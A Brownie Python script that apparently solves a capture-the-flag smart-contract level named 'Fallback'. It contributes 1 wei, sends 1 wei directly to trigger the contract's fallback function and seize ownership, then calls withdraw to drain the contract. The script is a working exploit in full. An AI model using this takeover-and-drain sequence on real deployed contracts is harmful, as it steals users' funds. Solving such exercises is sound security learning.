from brownie import Fallback, network, config, accounts

def main():

    InstanceAddress = '0x2bf7f1218462A4Fffe4E8F48514C4A89390efC61' # instance address

    player = accounts.add(config["wallets"]["from_key"]) 
    
    FBcontract = Fallback.at(InstanceAddress) 

    print("calling contribute to contribute 1 wei")
    FBcontract.contribute({"from": player, 'value': 1}) # send 1 wei to pass as a contributor
    print("Contribution: ", FBcontract.getContribution({"from": player}))

    print("calling transfer to transfer 1 wei into contract")
    fbAcc = accounts.at(FBcontract.address, force=True)
    player.transfer(fbAcc, 1) #send 1 wei to trigger fallback

    print("We are now owner, withdraw in progress")
    FBcontract.withdraw({"from": player})